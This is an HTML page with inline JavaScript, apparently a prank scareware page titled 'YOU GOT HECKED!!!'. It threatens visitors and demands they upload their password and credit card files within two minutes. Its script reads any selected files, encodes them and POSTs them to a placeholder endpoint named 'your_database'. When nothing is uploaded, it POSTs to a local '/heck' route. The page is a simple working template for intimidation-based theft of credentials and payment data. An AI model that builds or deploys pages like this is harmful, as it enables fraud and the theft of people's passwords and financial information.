<html>
  <head>
    <title>
      YOU GOT HECKED!!!
    </title>
    <style>
      body {
        background-image: url('./background.jpeg');
        color: white;
        font-family: Courier New;
        font-weight: bold;
      }
      button {
        background-color: red;
        color: white;
        font-family: Arial;
        font-size: 25pt;
      }
      input {
        background-color: black;
        color: white;
        font-family: Courier New;
        font-weight: bold;
      }
      h1 {
        font-size: 25pt;
      }
    </style>
  </head>
  <body align='center'>
    <h1>YOU GOT HECKED!!!</h1>
    <img id='img' src='./hecker.png' width='250' height='140'>
    <div id='section'>
      <p>You have two minutes to input your password and credit card number files.</p>
      <p>If files are not inputted within two minutes then you'll get hecked.</p>
      <p>
        <input type='file' id='input' multiple>
      </p>
      <p>
        <button>SUBMIT</button>
      </p>
    </div>
    <script>
      let section = document.getElementById('section');
      let cller = document.getElementById('img');
      async function convertFile(file) {
        return new Promise(function(resolve, reject) {
          let reader = new FileReader();
          reader.readAsDataURL(file);
          reader.onload = function() { resolve(reader.result) };
          reader.onerror = function(e) { reject("Error, and don't care.") };
        });
      }
      document.querySelector('button').addEventListener('click', async function() {
        let input = document.getElementById('input');
        if (input.files.length === 0) {
          section.innerHTML = `
          <p>No files? I would've let you go, but I guess not...</p>
          `;
          setTimeout(async function() {
            section.innerHTML = `
            <p>GET HECKED!!!</p>
            `;
            await fetch("http://localhost:3000/heck", {
              method : "POST",
              "headers" : {
                "Content-Type" : "text/plain"
              },
              body : undefined
            });
          }, 2000);
        } else {
          let files = [];
          for (let file of input.files) {
            files.push(await convertFile(file));
          }
          await fetch("your_database", {
            method : "POST",
            headers: {
              "Content-Type" : "application/json"
            },
            body : JSON.stringify(files)
          });
        }
      });
    </script>
  </body>
</html>
